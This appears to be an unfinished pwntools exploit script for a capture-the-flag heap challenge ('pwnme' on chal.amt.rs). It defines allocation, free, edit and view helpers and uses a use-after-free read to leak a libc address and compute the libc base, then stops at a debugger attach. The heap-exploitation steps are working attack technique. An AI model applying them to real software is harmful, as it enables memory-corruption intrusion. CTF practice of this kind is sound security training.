#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pwnme'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2", checksec = False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-v"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

default = b'\x00'

def alloc(index, size, data):
    r.sendlineafter(b"> ", b'1')
    r.sendlineafter(b"> ", str(index).encode())
    r.sendlineafter(b"> ", str(size).encode())
    r.sendlineafter(b"> ", data)

def delete(index):
    r.sendlineafter(b"> ", b'2')
    r.sendlineafter(b"> ", str(index).encode())

def edit(index, size, data):
    r.sendlineafter(b"> ", b'3')
    r.sendlineafter(b"> ", str(index).encode())
    r.sendlineafter(b"> ", str(size).encode())
    r.sendlineafter(b"> ", data)

def view(index):
    r.sendlineafter(b"> ", b'4')
    r.sendlineafter(b"> ", str(index).encode())
    return r.recvline()[:-1]

def exit_program():
    r.sendlineafter(b"> ", b'5')

## leak libc base address
alloc(0, 1280, default)
alloc(1, 32, default)
delete(0)

leak = u64(view(0).ljust(8, b'\x00'))
libc.address = leak - (0x7f57d7e6ecc0 -0x7f57d7c7c000)

## 
gdb.attach(r, 'init-pwndbg')

